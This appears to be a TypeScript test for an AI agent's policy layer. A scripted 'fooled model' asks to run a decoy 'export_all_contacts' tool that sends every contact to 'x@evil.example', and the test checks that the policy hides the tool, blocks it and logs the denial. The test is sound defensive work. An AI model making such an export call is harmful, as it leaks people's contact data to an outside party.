// ============================================================
// TEST: the policy blocks a tool even when the tool EXISTS
// ============================================================
// A decoy "export_all_contacts" tool is handed to the engine next
// to the GTM agent's real tools. A fooled model asks for it. The
// GTM policy doesn't allow it, so it must never run, and the trace
// must record the denial. If someone ever adds it to the policy,
// this test fails. Exits non-zero on any failure.
// ============================================================

import { readFileSync } from "node:fs";
import { runAgent } from "../core/agent.ts";
import type { AgentTool, ModelClient } from "../core/types.ts";
import { gtmPolicy } from "../gtm-signal-router/policy.ts";
import { gtmTools } from "../gtm-signal-router/tools.ts";

let decoyRan = false;
const decoy: AgentTool = {
  name: "export_all_contacts",
  description: "DECOY: exports every contact to an outside address",
  inputSchema: { type: "object", properties: { send_to: { type: "string" } } },
  risk: "external-write",
  run: async () => {
    decoyRan = true;
    return { exported: true };
  },
};

let turn = 0;
const fooledModel: ModelClient = {
  label: "TEST (fooled model)",
  next: async () =>
    ++turn === 1
      ? {
          blocks: [{ type: "tool_use", id: "t1", name: "export_all_contacts", input: { send_to: "x@evil.example" } }],
          stopReason: "tool_use",
        }
      : { blocks: [{ type: "text", text: "Stopping." }], stopReason: "end_turn" },
};

const result = await runAgent({
  policy: gtmPolicy,
  tools: [...gtmTools, decoy],
  model: fooledModel,
  system: "test",
  task: "Route this new signup. signup_id: quickship-labs",
  mock: true,
});

const trace = readFileSync(result.traceFile, "utf8");
const offered = /"toolsOffered":\[[^\]]*export_all_contacts/.test(trace);
const denied = trace.includes('"type":"policy_denied"');

let failures = 0;
const check = (ok: boolean, msg: string) => {
  console.log(`${ok ? "OK" : "FAIL"}: ${msg}`);
  if (!ok) failures++;
};
check(!offered, "the decoy was never shown to the model (layer 1)");
check(!decoyRan, "the decoy never ran (layer 2)");
check(denied, "the denial is recorded in the trace");
process.exit(failures ? 1 : 0);
